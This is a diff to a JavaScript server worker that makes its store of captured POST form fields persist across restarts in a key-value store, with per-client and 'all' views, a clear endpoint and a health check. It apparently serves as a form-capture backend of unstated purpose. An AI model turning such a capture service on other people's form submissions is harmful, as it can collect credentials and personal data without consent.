@@ -38,6 +38,39 @@ var accountsLoaded = false;
 var namesLoaded = false;
 var devClientLoaded = false;
 
+/* ---------- captures KV persistence (restart-proof) ---------- */
+var capLoaded = false;
+var capDirty = false;
+var capLastSave = 0;
+var CAP_KV_MAX = 1000;
+
+async function loadCaptures() {
+  if (capLoaded || !hasKV()) return;
+  capLoaded = true;
+  try {
+    var raw = await ENV.KV_DATA.get("cap:data");
+    if (raw) {
+      var arr = JSON.parse(raw);
+      if (Array.isArray(arr)) captures = arr;
+    }
+  } catch (e) {}
+}
+
+async function saveCaptures(force) {
+  if (!hasKV()) return;
+  var now = Date.now();
+  if (!force && now - capLastSave < 5000) {
+    capDirty = true;
+    return;
+  }
+  capLastSave = now;
+  capDirty = false;
+  try {
+    var snap = captures.length > CAP_KV_MAX ? captures.slice(0, CAP_KV_MAX) : captures;
+    await ENV.KV_DATA.put("cap:data", JSON.stringify(snap));
+  } catch (e) {}
+}
+
 function hasKV() {
   return !!(ENV && ENV.KV_DATA);
 }
@@ -343,20 +376,26 @@ async function handle(request) {
       }
     }
     if (path === "/api/captures" && method === "GET") {
+      await loadCaptures();
+      if (capDirty) await saveCaptures(true);
       var mine = sess.clientId === "all"
         ? captures
         : captures.filter(function (c) { return c.clientId === sess.clientId; });
       return jsonResp(mine);
     }
     if (path === "/api/clear" && method === "POST") {
+      await loadCaptures();
       if (sess.clientId === "all") {
         captures = [];
       } else {
         captures = captures.filter(function (c) { return c.clientId !== sess.clientId; });
       }
+      await saveCaptures(true);
       return jsonResp({ ok: true, message: "cleared" });
     }
     if (path === "/api/health" && method === "GET") {
+      await loadCaptures();
+      if (capDirty) await saveCaptures(true);
       return jsonResp({ ok: true, captures: captures.length, kv: hasKV(), time: new Date().toISOString() });
     }
     if (path.indexOf("/api/file/") === 0 && method === "GET") {
@@ -464,6 +503,7 @@ function sessionResp(tok) {
 
 /* ---------- capture ---------- */
 async function capturePost(request, url) {
+  await loadCaptures();
   await loadNames();
   await loadDevClient();
   var fields = {};
@@ -554,6 +594,7 @@ async function capturePost(request, url) {
   if (captures.length > MAX_CAPTURES) {
     captures.pop();
   }
+  await saveCaptures(false);
   return cap;
 }
 
